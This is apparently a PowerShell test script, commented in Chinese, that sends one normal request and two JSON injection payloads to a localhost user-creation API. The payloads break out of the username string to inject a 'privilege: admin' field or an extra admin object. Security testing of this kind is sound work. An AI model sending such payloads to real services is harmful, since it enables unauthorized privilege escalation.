# JSON注入测试脚本

Write-Host "1. 发送正常请求:"
$normalPayload = @{
    username = "normaluser"
} | ConvertTo-Json
Write-Host "Payload: $normalPayload"
try {
    $result = Invoke-RestMethod -Uri "http://localhost:3000/api/user/create" -Method Post -ContentType "application/json" -Body $normalPayload
    Write-Host "Result: $result" -ForegroundColor Green
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}

Write-Host "`n2. JSON注入攻击 - 修改权限:"
# 这个payload会闭合原始的username字段，然后注入新的privilege字段
$injectionPayload1 = '{"username": "hacker\", \"privilege\": \"admin\", \"injected\": \"true"}'
Write-Host "Payload: $injectionPayload1"
try {
    $result = Invoke-RestMethod -Uri "http://localhost:3000/api/user/create" -Method Post -ContentType "application/json" -Body $injectionPayload1
    Write-Host "Result: $result" -ForegroundColor Yellow
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}

Write-Host "`n3. JSON注入攻击 - 注入新对象:"
$injectionPayload2 = '{"username": "user\"}, {\"admin\": \"true\", \"user\": \"attacker"}'
Write-Host "Payload: $injectionPayload2"
try {
    $result = Invoke-RestMethod -Uri "http://localhost:3000/api/user/create" -Method Post -ContentType "application/json" -Body $injectionPayload2
    Write-Host "Result: $result" -ForegroundColor Yellow
} catch {
    Write-Host "Error: $_" -ForegroundColor Red
}
